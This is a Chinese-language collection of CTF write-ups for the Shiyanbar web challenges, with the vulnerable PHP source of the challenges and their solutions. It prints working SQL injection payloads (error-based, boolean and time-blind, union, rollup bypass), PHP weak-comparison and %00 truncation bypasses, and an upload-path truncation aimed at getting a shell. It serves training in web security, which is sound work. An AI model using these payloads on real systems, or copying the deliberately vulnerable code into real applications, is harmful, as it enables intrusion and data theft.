# 实验吧Web部分
## 题目类型：
| 类型 | 年份 | 难度 |
|:----:|:----:|:----:|
|网上练习题|无|易|

# 题目下载：
+ 暂无

# 网上公开WP：
+ https://www.cnblogs.com/sch01ar/p/7996159.html
+ https://www.0x002.com/2019/百道CTF刷题记录(一)/

# 本站备份WP:
**作者：Yunen**
## 简介
最近在刷CTF题，主攻Web，兼职Misc
<!--more-->
## Shiyanbar
### 0x01 简单的登陆题  
#### 简单概括：
+ 考点： %00截断正则 CBC字节翻转攻击  
+ 难度： 难  
+ WP：https://blog.csdn.net/include_heqile/article/details/79942993  

#### 解题过程：  
F12查看响应头，发现返回tips  
![](https://i.loli.net/2019/04/08/5cab35507b9c4.png)  
访问test.php文件得到源代码：
```
<?php
define("SECRET_KEY", '***********');
define("METHOD", "aes-128-cbc");
error_reporting(0);
include('conn.php');
function sqliCheck($str){
	if(preg_match("/\\\|,|-|#|=|~|union|like|procedure/i",$str)){
		return 1;
	}
	return 0;
}
function get_random_iv(){
    $random_iv='';
    for($i=0;$i<16;$i++){
        $random_iv.=chr(rand(1,255));
    }
    return $random_iv;
}
function login($info){
	$iv = get_random_iv();
	$plain = serialize($info);
    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);
    setcookie("iv", base64_encode($iv));
    setcookie("cipher", base64_encode($cipher));
}
function show_homepage(){
	global $link;
    if(isset($_COOKIE['cipher']) && isset($_COOKIE['iv'])){
        $cipher = base64_decode($_COOKIE['cipher']);
        $iv = base64_decode($_COOKIE["iv"]);
        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){
            $info = unserialize($plain) or die("<p>base64_decode('".base64_encode($plain)."') can't unserialize</p>");
            $sql="select * from users limit ".$info['id'].",0";
            $result=mysqli_query($link,$sql);
            
            if(mysqli_num_rows($result)>0  or die(mysqli_error($link))){
            	$rows=mysqli_fetch_array($result);
				echo '<h1><center>Hello!'.$rows['username'].'</center></h1>';
			}
			else{
				echo '<h1><center>Hello!</center></h1>';
			}
        }else{
            die("ERROR!");
        }
    }
}
if(isset($_POST['id'])){
    $id = (string)$_POST['id'];
    if(sqliCheck($id))
		die("<h1 style='color:red'><center>sql inject detected!</center></h1>");
    $info = array('id'=>$id);
    login($info);
    echo '<h1><center>Hello!</center></h1>';
}else{
    if(isset($_COOKIE["iv"])&&isset($_COOKIE['cipher'])){
        show_homepage();
    }else{
        echo '<body class="login-body" style="margin:0 auto">
                <div id="wrapper" style="margin:0 auto;width:800px;">
                    <form name="login-form" class="login-form" action="" method="post">
                        <div class="header">
                        <h1>Login Form</h1>
                        <span>input id to login</span>
                        </div>
                        <div class="content">
                        <input name="id" type="text" class="input id" value="id" onfocus="this.value=\'\'" />
                        </div>
                        <div class="footer">
                        <p><input type="submit" name="submit" value="Login" class="button" /></p>
                        </div>
                    </form>
                </div>
            </body>';
    }
}?>
```
代码分析：  
+ sqliCheck函数负责过滤sql注入
+ get_random_iv 生成16位随机数(Asicc范围在0~255内)iv

漏洞原因：  
aes-128-cbc加密存在CBC翻转攻击(不理解，暂时跳过)

### 0x02 后台登录  
#### 简单概括：
+ 考点：md5()函数16位二进制格式绕过，`md5("ffifdyop",True)`得到的加密字符串为`'or'6<crash>`(注：`or '数字+字母'` 等价于`or true`)  
+ 难度：易  
+ WP：https://blog.csdn.net/qq_36791003/article/details/81746730  

#### 解题过程：
打开网页，右键查看源代码发现源码：  
![](https://i.loli.net/2019/04/08/5cab35767dac4.png)  
```
<!-- $password=$_POST['password'];
$sql = "SELECT * FROM admin WHERE username = 'admin' and password = '".md5($password,true)."'";
$result=mysqli_query($link,$sql);
    if(mysqli_num_rows($result)>0){
        echo 'flag is :'.$flag;
    }
    else{
        echo '密码错误!';
    } -->
```
上网查了下，了解到md5($password,true)返回的是**原始 16 字符二进制格式**的密文,返回的内容可以存在单引号，故我们可以找个字符串，使其md5(str,true)加密过返回的字符串与原sql语句拼接造成SQL注入攻击。  
经过简单的Fuzz,我们知道：字符串`'or'6<乱码>"`，此时如果拼接到sql语句中，那么这条语句将会变成一条永真式，因此成功登录，获得flag。  
![](https://i.loli.net/2019/04/08/5cab35767372d.png)  
### 0x03 加了料的报错注入  
#### 简单概括：
+ + 考点：双参数注释绕过，`=`被过滤可用`regexp 'xxx'`和`in (0xaaaa)`代替
+ 难度： 中  
+ WP：https://www.jianshu.com/p/95f18a32ec7b  

#### 解题过程：
观察题目可知此题考的是报错注入，右键源代码得到提升：Post发送username&password。  
![](https://i.loli.net/2019/04/08/5cab35769ace0.png)  
sql语句如下：
```
$sql="select * from users where username='$username' and password='$password'";
```
注意：此处可控的参数有两个。  
简单手工测试，发现过滤了`#，and`等关键字，而且username处单独过滤了右括号，这意味着我们无法再username出使用函数，因而我们将目光转向password。  
![](https://i.loli.net/2019/04/08/5cab357692922.png)  
经过一番人工Fuzz，发现只有exp()函数没有被过滤，故我们构造语句：`exp(~(select * from(select user())a))`成功爆出用户名。
最终我们的payload如下：
```
username=a'/*&password=*/Or exp(~(select * from(select database())a))or'1 
//查询当前数据库
username=a'/*&password=*/Or exp(~(select * from(select group_concat(table_name) from information_schema.tables where table_schema regexp 'error_based_hpf')a))or'1 
//查询表名，此处由于=被过滤，我们使用regexp来绕过
username=a'/*&password=*/Or exp(~(select * from(select group_concat(column_name) from information_schema.columns where table_name regexp 'ffll44jj')a))or'1
//查询列名，此处由于and被过滤，故而不加数据库名的验证，在实际渗透中最好还是尽量加上。
username=a'/*&password=*/Or exp(~(select * from(select group_concat(value) from ffll44jj)a))or'1
//获取flag
```
### 0x04 认真一点！  
#### 简单概括：
+ 考点：双层叠加绕过过滤，大小写绕过，from()for()代替偏移，布尔盲注  
+ 难度：难  
+ WP：https://blog.csdn.net/xingyyn78/article/details/79747404  

#### 解题过程：
打开网页，随便输入个数字，页面返回`You are in...`，输入在数字后加单引号，返回`You are not in...`。  
![](https://i.loli.net/2019/04/08/5cab407181198.png)  
猜测此处考的是bool盲注，根据页面返回的内容判断真假。  
经过一番简单的fuzz，发现此处过滤的函数只会过滤一次，那么我们可以将过滤关键词双写：`oorr`就好了。  
```
id=aaa'oorr(1=1)='1  //返回You are in
id=aaa'oorr(1=2)='1  //返回You are not in
// 此处的aaa是为了让前边条件为假，那么sql语句的判断将依赖于后边的语句
// 即：false ∪ (条件一) = 条件一
```
我们先判断数据库长度：
```
id=aaa'oorr(length(database())>1)='1
```
其次循环取数据库名进行判断：
```
id=aaa'oorr(mid((select+database())from(1)foorr(1))='c')='1 
//由于,被过滤，使用from与for进行绕过，记得for要写成foorr绕过过滤，+号绕过空格过滤
```
接着循环判断表名：
```
id=aaa'oorr(mid((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))from(1)foorr(1))='a')='1
```
之后就不写了，与上边类似，写脚本跑就好。  

### 0x05 你真的会PHP吗？  
#### 简单概括：
+ 考点：is_numeric函数的绕过(%20|%00)、PHP32位系统整数型变量最大值为：`2147483647`(2^31-1) 64位：`9223372036854775807`(2^63-1)  
+ 难度：中  
+ WP：https://blog.csdn.net/JBlock/article/details/78745513  

#### 解题过程：
打开题目，发现返回头存在提示信息：  
![](https://i.loli.net/2019/04/09/5cac89ded0e73.png)  
打开链接获得源码：  
```
<?php
$info = ""; 
$req = [];
$flag="xxxxxxxxxx";
ini_set("display_error", false); 
error_reporting(0); 

if(!isset($_POST['number'])){
   header("hint:6c525af4059b4fe7d8c33a.txt");
   die("have a fun!!"); 
}
foreach([$_POST] as $global_var) { 
    foreach($global_var as $key => $value) { 
        $value = trim($value); 
        is_string($value) && $req[$key] = addslashes($value); 
    } 
} 
function is_palindrome_number($number) { 
    $number = strval($number); 
    $i = 0; 
    $j = strlen($number) - 1; 
    while($i < $j) { 
        if($number[$i] !== $number[$j]) { 
            return false; 
        } 
        $i++; 
        $j--; 
    } 
    return true; 
} 
if(is_numeric($_REQUEST['number'])){
     $info="sorry, you cann't input a number!";
}elseif($req['number']!=strval(intval($req['number']))){
     $info = "number must be equal to it's integer!! ";  
}else{
     $value1 = intval($req["number"]);
     $value2 = intval(strrev($req["number"]));  
     if($value1!=$value2){
          $info="no, this is not a palindrome number!";
     }else{
          if(is_palindrome_number($req["number"])){
              $info = "nice! {$value1} is a palindrome number!"; 
          }else{
             $info=$flag;
          }
     }
}
echo $info;
?>
```
代码流程：  
`is_numeric[false] && $req['number']!=strval(intval($req['number']))[false] `  
-> `$value1!=$value2[false]`  
-> `is_palindrome_number($req["number"])[true]`  

**我们知道is_numeric函数与ereg函数一样，存在截断漏洞，而第二个if判断存在弱类型比较的漏洞，我们将这两个漏洞组合起来打一套组合拳。**  
PHP语言对于32位系统的int变量来说，最大值是2147483647，如果我们传入的数值为2147483647的话，经过strrev函数反转再转成int函数仍是2147483647，因为746384741>2147483647，转成int变量会减小成2147483647，故而绕过看似矛盾的条件。  
而对于开始的is_numeric，加上%00或%20即可，此时is_numeric函数便不会认为这是个数字，而对于下边的strval()in、intval()却无影响。  
综上所述，我们的number应为：2147483647%00、2147483647%20、%002147483647。
>此处%20不能再开头的原因是intval()会将其转换成数字0，而%00无影响。  

![](https://i.loli.net/2019/04/09/5cac89deb6100.png)
### 0x06 登陆一下好吗??
#### 简单概括：
+ 考点：登录框万能密码  
+ 难度：中  
+ WP：https://blog.csdn.net/h1012946585/article/details/79851884  

#### 解题过程：
打开页面，猜测考的是万能密码，手动Fuzz发现过滤了or，故改用`'='`成功。

### 0x07 who are you?
#### 简单概括：
+ 考点：时间盲注，and case when () then () else () end绕过逗号过滤。  
+ 难度：中  
+ WP：https://blog.csdn.net/wy_97/article/details/75643252  

#### 解题过程：
抓包，发现回显的数据貌似是直接取header的值，没有经过数据库，使用报错注入失败，猜测是盲注，由于bool盲注返回的页面一致，故此题应为时间盲注：  
![](https://i.loli.net/2019/04/09/5cac910608206.png)  
简单测试发现逗号被过滤，导致我们无法使用if语句，不过我们可以换成case when then else语句代替：
+ X-Forwarded-For: 127.0.0.1'and case when(length(database())>1)then(sleep(5))else(sleep(0))end and '1  

剩下的就是写脚本慢慢跑了，此处略过。
### 0x08 因缺思汀的绕过
#### 简单概括：
+ 考点：`gourp by xxx with rollup limit 1 offset x#`【创建虚拟表最后一行为pwd的值为NULL，借用offset偏移到最后一个，post传输空的pwd，满足条件】  
+ 难度：中  
+ WP：https://blog.csdn.net/qq_35078631/article/details/54772798  

#### 解题过程：
右键源代码得到提示信息`source.txt`，打开得到源码。  
```
<?php
error_reporting(0);

if (!isset($_POST['uname']) || !isset($_POST['pwd'])) {
	echo '<form action="" method="post">'."<br/>";
	echo '<input name="uname" type="text"/>'."<br/>";
	echo '<input name="pwd" type="text"/>'."<br/>";
	echo '<input type="submit" />'."<br/>";
	echo '</form>'."<br/>";
	echo '<!--source: source.txt-->'."<br/>";
    die;
}

function AttackFilter($StrKey,$StrValue,$ArrReq){  
    if (is_array($StrValue)){
        $StrValue=implode($StrValue);
    }
    if (preg_match("/".$ArrReq."/is",$StrValue)==1){   
        print "水可载舟，亦可赛艇！";
        exit();
    }
}

$filter = "and|select|from|where|union|join|sleep|benchmark|,|\(|\)";
foreach($_POST as $key=>$value){ 
    AttackFilter($key,$value,$filter);
}

$con = mysql_connect("XXXXXX","XXXXXX","XXXXXX");
if (!$con){
	die('Could not connect: ' . mysql_error());
}
$db="XXXXXX";
mysql_select_db($db, $con);
$sql="SELECT * FROM interest WHERE uname = '{$_POST['uname']}'";
$query = mysql_query($sql); 
if (mysql_num_rows($query) == 1) { 
    $key = mysql_fetch_array($query);
    if($key['pwd'] == $_POST['pwd']) {
        print "CTF{XXXXXX}";
    }else{
        print "亦可赛艇！";
    }
}else{
	print "一颗赛艇！";
}
mysql_close($con);
?>
```
阅读源码可知，我们需要让数据库返回的pwd字段与我们post的内容相同，注意此处是弱类型比较。  
我们知道grou by with roolup 将创建个虚拟表，且表的最后一行pwd字段为Null。  
>mysql> create table test (  
    -> user varchar(100) not null,  
    -> pwd varchar(100) not null);    
mysql>insert into test values("admin","mypass");  
mysql>select * from test group by pwd with rollup  
mysql> select * from test group by pwd with rollup;  
+-------+------------+  
| user  | pwd        |  
+-------+------------+  
| guest | alsomypass |  
| admin | mypass     |  
| admin | NULL       |  
+-------+------------+  
3 rows in set  
mysql> select * from test group by pwd with rollup limit 1  
;  
+-------+------------+  
| user  | pwd        |  
+-------+------------+  
| guest | alsomypass |  
+-------+------------+  
mysql> select * from test group by pwd with rollup limit 1 offset 0  
;  
+-------+------------+  
| user  | pwd        |  
+-------+------------+  
| guest | alsomypass |  
+-------+------------+  
1 row in set  
mysql> select * from test group by pwd with rollup limit 1 offset 1  
;  
+-------+--------+  
| user  | pwd    |  
+-------+--------+  
| admin | mypass |  
+-------+--------+  
1 row in set  
mysql> select * from test group by pwd with rollup limit 1 offset 2  
;  
+-------+------+  
| user  | pwd  |  
+-------+------+  
| admin | NULL |  
+-------+------+  
1 row in set   

构造payload:  
`uname=1' or true group by pwd with rollup limit 1 offset 2#&pwd=`  
offset 2为偏移两个数据，即第三行的pwd字段为空。  
![](https://i.loli.net/2019/04/09/5cac9b6950ed3.png)  
### 0x09 简单的sql注入之3
#### 简单概括：
+ 考点：mysql报错注入
+ 难度：易  
+ WP：https://www.cnblogs.com/caizhiren/p/7846917.html  

#### 解题过程：
exp函数报错一把嗦  
![]()  

### 0x0A 简单的sql注入之2
#### 简单概括：
+ 考点：空格过滤  
+ 难度：易  
+ WP：https://www.cnblogs.com/caizhiren/p/7862466.html  

#### 解题过程：
简单Fuzz发现过滤了空格，使用内敛注释一把嗦。 
```
/**/select/**/group_concat(table_name)/**/from/**/information_schema.tables=database()
```

### 0x0B 简单的sql注入之1
#### 简单概括：
+ 考点：双层叠加绕过  
+ 难度：易
+ WP：https://www.jianshu.com/p/5d37d33854e3  

#### 解题过程
```
selectselect 
```
### 0x0C 天下武功唯快不破
#### 简单概括：
+ 考点：脚本工具的编写  
+ 难度：易  
+ WP：无

#### 解题过程：
```
import requests,base64
r = requests.get('http://ctf5.shiyanbar.com/web/10/10.php')
key=base64.b64decode(r.headers['FLAG'])[-9:]
r = requests.post('http://ctf5.shiyanbar.com/web/10/10.php',data={'key':key})
print(r.text)
```

### 0x0D 让我进去
#### 简单概括：
+ 考点：hash长度拓展攻击  
+ 难度：难  
+ WP：http://www.0x002.com/2018/CTF%E5%AE%9E%E9%AA%8C%E5%90%A7%E8%AE%A9%E6%88%91%E8%BF%9B%E5%8E%BBwriteup/  

### 0x0E 拐弯抹角
#### 简单概括：
+ 考点：`index.php/index.php`  
+ 难度：易  
+ WP：无

#### 解题过程：
```
index.php/index.php
```

### 0X0F Forms
#### 简单概括：
+ 考点：不清楚，过于简单  
+ 难度：无  
+ WP：无  

### 0x10 天网管理系统
#### 简单概括：
+ 考点：PHP`==`弱类型比较，PHP序列化与反序列化  
+ 难度：易  
+ WP：http://www.cnblogs.com/ssooking/p/5877086.html  

#### 解题过程：
右键查看源代码发现部分源码 ：  
![](https://i.loli.net/2019/04/09/5caca4c359172.png)  
我们知道0e开头的字符串在与数字0做弱类型比较时会先转成数值0在比较，故：我们只要输入一个经md5加密后密文为0e开头的字符串即可。  
```
s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s214587387a
0e848240448830537924465865611904
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s1885207154a
0e509367213418206700842008763514
s1502113478a
0e861580163291561247404381396064
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s155964671a
0e342768416822451524974117254469
s1184209335a
0e072485820392773389523109082030
s1665632922a
0e731198061491163073197128363787
s1502113478a
0e861580163291561247404381396064
s1836677006a
0e481036490867661113260034900752
s1091221200a
0e940624217856561557816327384675
s155964671a
0e342768416822451524974117254469
s1502113478a
0e861580163291561247404381396064
s155964671a
0e342768416822451524974117254469
s1665632922a
0e731198061491163073197128363787
s155964671a
0e342768416822451524974117254469
s1091221200a
0e940624217856561557816327384675
s1836677006a
0e481036490867661113260034900752
s1885207154a
0e509367213418206700842008763514
s532378020a
0e220463095855511507588041205815
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s214587387a
0e848240448830537924465865611904
s1502113478a
0e861580163291561247404381396064
s1091221200a
0e940624217856561557816327384675
s1665632922a
0e731198061491163073197128363787
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s1665632922a
0e731198061491163073197128363787
s878926199a
0e545993274517709034328855841020
```
### 0x11 忘记密码了
#### 简单概括：
+ 考点：vim源码泄露  
+ 难度：中  
+ WP：`.submit.php.swp`

#### 解题过程：
打开题目，观察源码，发现管理员邮箱：admin@simplexue.com，随便输入一个内容提交，显示step2.php，尝试访问step2.php，网页被重定向且返回html源码，发现存在submit.php文件，猜测存在swp源码泄露，访问.submit.php.swp文件得到部分源码。
![](https://i.loli.net/2019/04/09/5cacae6dda29d.png)  
```
........这一行是省略的代码........

/*
如果登录邮箱地址不是管理员则 die()
数据库结构

--
-- 表的结构 `user`
--

CREATE TABLE IF NOT EXISTS `user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `token` int(255) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `user`
--

INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES
(1, '****不可见***', '***不可见***', 0);
*/


........这一行是省略的代码........

if(!empty($token)&&!empty($emailAddress)){
	if(strlen($token)!=10) die('fail');
	if($token!='0') die('fail');
	$sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'";
	$r = mysql_query($sql) or die('db error');
	$r = mysql_fetch_assoc($r);
	$r = $r['num'];
	if($r>0){
		echo $flag;
	}else{
		echo "失败了呀";
	}
}
	
```

payload: `token=0e11111111&emailAddress=admin@simplexue.com`  
![](https://i.loli.net/2019/04/09/5cacae6dedacc.png)  

### 0x12 Once More
#### 简单概括：
+ 考点：ereg函数%00截断，科学计数法  
+ 难度：易  
+ WP：`1e9%00*-*`

#### 解题过程：
打开题目，得到题目源码：
```
<?php
if (isset ($_GET['password'])) {
	if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
	{
		echo '<p>You password must be alphanumeric</p>';
	}
	else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)
	{
		if (strpos ($_GET['password'], '*-*') !== FALSE)
		{
			die('Flag: ' . $flag);
		}
		else
		{
			echo('<p>*-* have not been found</p>');
		}
	}
	else
	{
		echo '<p>Invalid password</p>';
	}
}
?>
```

首先判断是否用过get方式传入password，其次判断是否只含有数字和字母，如果是则返回错误，接着判断长度小于8且大于9999999。看到这里估计就知道是要考科学计数法了，最后要求get的数据包含`*-*`。  
我们知道1E8就等于10000000，这样就可以满足长度小于8且大于9999999的条件，不过我们先得绕开判断只有数字和字母的条件，我们知道ereg函数可利用%00进行截断攻击，故我们的payload构造如下：  
`?password=1e8%00*-*`  
注意此处的%00只占一个字符的大小。  
![](https://i.loli.net/2019/04/11/5caf5ee4d7fef.png)  
### 0x13 Guess Next Session
#### 简单概括：
+ 考点：Session与Cookie绑定，PHP弱类型比较  
+ 难度：易  
+ WP：`删掉Cookie，?password=`  

#### 解题过程：
打开题目得到源码：
```
<?php
session_start(); 
if (isset ($_GET['password'])) {
    if ($_GET['password'] == $_SESSION['password'])
        die ('Flag: '.$flag);
    else
        print '<p>Wrong guess.</p>';
}

mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));
?>
```
创建session，通过get方式取password值再与session里的password值进行比较，这里我们不知道 session里的password值是多少的，而且我们并不能控制session，不过这里的比较是用==弱类型比较，猜想，如果我们将cookie删除，那么$_SESSION['password']的值将为NULL，此时如果我们get传入的 password为空，即''，那么比较结果即为true。  
payload:  
`将cookie删除或禁用，接着访问?password=`
![](https://i.loli.net/2019/04/11/5caf5ee4d9f11.png)  

### 0x14 FALSE
#### 简单概括：
+ 考点：sha1,md5等传入数组返回Null，PHP弱类型比较  
+ 难度：易  
+ WP：`?name[]=1&password[]=2`  

#### 解题过程：
打开题目获得源码：
```
<?php
if (isset($_GET['name']) and isset($_GET['password'])) {
    if ($_GET['name'] == $_GET['password'])
        echo '<p>Your password can not be your name!</p>';
    else if (sha1($_GET['name']) === sha1($_GET['password']))
      die('Flag: '.$flag);
    else
        echo '<p>Invalid password.</p>';
}
else{
	echo '<p>Login first!</p>';
?>
```
我们知道sha1()函数与md5()类似，当参数为数组时会返回NULL，如果我们传入的name与password为数组时无论其为什么值，都可以通过`sha1($name)===sha1($password)`的强类型判断。  
故我们的payload构造如下：  
`?name[]=a&password[]=b`
![](https://i.loli.net/2019/04/11/5caf5ee4db525.png)  

### 0x15 上传绕过
####  简单概括：
+ 考点：目录名%00截断  
+ 难度：易  
+ WP：`/upload/1.php%00`  

#### 解题过程：
burp抓个上传包：  
![](https://i.loli.net/2019/04/11/5caf6134b532a.png)  
首先尝试了文件名%00阶段，发现无用，然后看到了我们可以控制上传的目录名，猜测后台为获取目录名再与文件名拼接。  
如果我们的目录名存在截断漏洞，那么我们可以构造/uploads/1.php%00这样拼接的时候就只有目录名，达到getshell的目的。  
![](https://i.loli.net/2019/04/11/5caf6134b0844.png)  

### 0x16 NSCTF web200
#### 简单概括：
+ 考点：逆加密过程  
+ 难度：易  
+ WP：
```
部分：
x = "~88:36e1bg8438e41757d:29cgeb6e48c`GUDTO|;hbmg"
c = ""
for a in x:
    b = ord(a)
    c += chr(b-1)
print(c)
```

#### 解题过程：
打开题目：  
![](http://ctf5.shiyanbar.com/web/web200.jpg)  
解密问题，按照加密过程反着解密即可。  

### 0x17 程序逻辑问题
#### 简单概括：
+ 考点：union select联合注入  
+ 难度：易  
+ WP：`user=123aaa%27+union+select+%27c4ca4238a0b923820dcc509a6f75849b&pass=1`  

#### 解题过程：
打开题目，右键查看源代码得到题目源码：
```
<html>
<head>
welcome to simplexue
</head>
<body>
<?php
if($_POST[user] && $_POST[pass]) {
	$conn = mysql_connect("********, "*****", "********");
	mysql_select_db("phpformysql") or die("Could not select database");
	if ($conn->connect_error) {
		die("Connection failed: " . mysql_error($conn));
} 
$user = $_POST[user];
$pass = md5($_POST[pass]);

$sql = "select pw from php where user='$user'";
$query = mysql_query($sql);
if (!$query) {
	printf("Error: %s\n", mysql_error($conn));
	exit();
}
$row = mysql_fetch_array($query, MYSQL_ASSOC);
//echo $row["pw"];
  
  if (($row[pw]) && (!strcasecmp($pass, $row[pw]))) {
	echo "<p>Logged in! Key:************** </p>";
}
else {
    echo("<p>Log in failure!</p>");
	
  }
}
?>
<form method=post action=index.php>
<input type=text name=user value="Username">
<input type=password name=pass value="Password">
<input type=submit>
</form>
</body>
<a href="index.txt">
</html>
```
strcasecmp()函数不分大小写进行字符串比较。  
首先我们不知道数据库里已有的用户值为多少，更不知其密码。  
不过我们可以通过构造联合查询注入来返回我们自定义的数据。   
payloadd:
`user=abc' union select 'c4ca4238a0b923820dcc509a6f75849b&pass=1`  
1的md5为：c4ca4238a0b923820dcc509a6f75849b  
![](https://i.loli.net/2019/04/11/5caf6479b0889.png)  

### 0x18 what a fuck!这是什么鬼东西?
#### 简单概括：
+ 考点：JSFUCK  
+ 难度：易  
+ WP：`复制代码到浏览器控制台执行即可`  

#### 解题过程：
复制粘贴进浏览器的js控制台，回车运行即可。  
![](https://i.loli.net/2019/04/12/5caf64ffb33cb.png)  

### 0x19 PHP大法
#### 简单概括：
+ 考点：PHP自动解码机制  
+ 难度：易  
+ WP：`id=%2568ackerDJ`

#### 解题过程：
打开题目，页面提示：index.php.txt，打开得到源码：  
```
<?php
if(eregi("hackerDJ",$_GET[id])) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "hackerDJ")
{
  echo "<p>Access granted!</p>";
  echo "<p>flag: *****************} </p>";
}
?>
<br><br>
Can you authenticate to this website?
```

`$_GET[id]`在取到值后已经自动urldecode了一次，然而后边再用urldecode解码一次，故可以使用二次编码绕过前边的关键字检测。  
![](https://i.loli.net/2019/04/12/5caf66674a8d7.png)  

### 0x1A 这个看起来有点简单!
#### 简单概括：
+ 考点：Union无过滤注入  
+ 难度：易  
+ WP：无

### 0x1B 貌似有点难
#### 简单概括：
+ 考点：Header头IP伪造  
+ 难度：易  
+ WP：无

### 0x1C 头有点大
#### 简单概括：
+ 考点：UA头伪造  
+ 难度：易  
+ WP：无  

### 0x1D 猫抓老鼠
#### 简单概括：
+ 考点：脑洞  
+ 难度：及其变态神经病的题目  
+ WP：无

#### 解题过程：
查看访问请求返回头，发现有东西：  
![](https://i.loli.net/2019/04/12/5caf67566e8f0.png)  
将这串base64放到表单里提交即可。

### 0x1E 看起来有点难
#### 简单概括：
+ 考点：时间盲注  
+ 难度：中  
+ WP：sqlmap一把嗦